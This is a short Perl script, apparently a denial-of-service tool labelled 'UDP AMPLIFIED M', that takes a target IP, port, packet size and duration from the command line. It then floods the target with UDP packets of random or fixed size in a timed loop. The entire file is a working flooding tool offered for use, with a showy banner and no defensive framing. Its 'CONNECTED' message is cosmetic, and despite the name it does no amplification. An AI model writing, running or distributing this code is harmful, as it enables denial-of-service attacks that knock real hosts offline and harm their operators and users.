#!/usr/bin/perl

use Socket;
use strict;

if ($#ARGV != 3) {
  print "\n\t\t\t***Command must recieve 4 arguments***\n";
  print "perl uam 69.69.69.69 0 65500 0\n";
  exit(1);
}

my ($ip,$port,$size,$time) = @ARGV;
my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "Cannot connect to $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print "\n\033[1;m[\033[31mUDP AMPLIFIED M\033[1;m]\n\033[1;31mSetting up sockets.. ";
sleep 1;
print "\033[1;m[\033[1;33mDONE\033[1;m]\033[1;31m\nConnecting to the host.. \033[1;m[\033[1;33mCONNECTED\033[1;m]\n\033[1;31mHitting \033[1;33m$ip..\033[1;m";
sleep 1;
print "\n\033[1;31mHitting \033[1;33m$ip..\033[1;m"; 

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));} 
